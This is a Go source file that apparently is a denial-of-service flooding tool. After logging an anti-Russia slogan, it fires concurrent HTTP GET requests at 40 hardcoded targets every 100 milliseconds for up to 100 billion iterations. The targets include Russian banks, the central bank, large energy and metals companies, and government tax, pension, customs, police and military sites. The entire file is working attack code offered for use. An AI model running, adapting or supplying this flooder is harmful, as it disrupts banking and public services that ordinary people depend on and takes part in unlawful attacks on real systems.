package main

import (
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/vardius/progress-go"
)

func MakeRequest(url string, ch chan<- string) {
	start := time.Now()
	_, err := http.Get(url)
	if err != nil {
	}
	secs := time.Since(start).Seconds()
	ch <- fmt.Sprintf("%.2f elapsed for url: %s", secs, url)
}

func processUrls(urls []string) {
	for _, url := range urls {
		ch := make(chan string)
		go MakeRequest(url, ch)
	}
}

func main() {
	log.Println("Fuck russia!")
	targets := [40]string{
		// Business and corps 
		"https://cbr.ru/", "https://www.gazprom.ru", "https://lukoil.ru", "https://magnit.ru",
		"https://www.nornickel.com", "https://www.surgutneftegas.ru", "https://www.tatneft.ru", "https://www.evraz.com/ru",
		"https://nlmk.com", "https://www.sibur.ru", "https://www.severstal.com", "https://www.metalloinvest.com",
		"https://nangs.org", "https://rmk-group.ru", "https://www.tmk-group.ru", "https://ya.ru",
		"https://www.polymetalinternational.com/ru", "https://www.uralkali.com/ru", "https://www.eurosib.ru", "https://omk.ru",

		// Banks
		"https://www.sberbank.ru", "https://www.vtb.ru", "https://www.gazprombank.ru",

		// Government
		"https://www.gosuslugi.ru", "https://www.mos.ru/uslugi", "http://kremlin.ru", "http://government.ru",
		"https://mil.ru", "https://www.nalog.gov.ru", "https://customs.gov.ru", "https://pfr.gov.ru",
		"https://rkn.gov.ru", "https://109.207.1.118/", "https://109.207.1.97/", "https://mail.rkn.gov.ru",
		"https://cloud.rkn.gov.ru", "https://mvd.gov.ru", "https://pwd.wto.economy.gov.ru", "https://stroi.gov.ru",
		"https://proverki.gov.ru",
	}
	iterations := 100000000000

	bar := progress.New(0, int64(iterations))
	_, _ = bar.Start()
	defer func() {
		if _, err := bar.Stop(); err != nil {
			log.Printf("failed to finish progress: %v", err)
		}

		log.Println("Done!")
	}()

	for i := 0; i < iterations; i++ {
		go processUrls(targets[:])
		time.Sleep(100 * time.Millisecond)
		_, _ = bar.Advance(1)
	}
}
